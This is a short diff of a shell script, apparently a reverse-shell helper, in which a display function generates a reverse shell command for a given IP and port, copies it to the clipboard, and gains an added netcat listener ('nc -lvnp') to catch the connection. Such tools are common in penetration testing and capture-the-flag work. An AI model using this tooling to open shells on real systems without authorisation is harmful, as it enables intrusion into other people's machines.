@@ -42,6 +42,8 @@ function display() {
 	reverseShell=$(getReverseShell $ip $port)
 
 	echo -n "$reverseShell" | /usr/bin/xclip -i -selection clipboard
+
+	nc -lvnp $port
 }
 
 
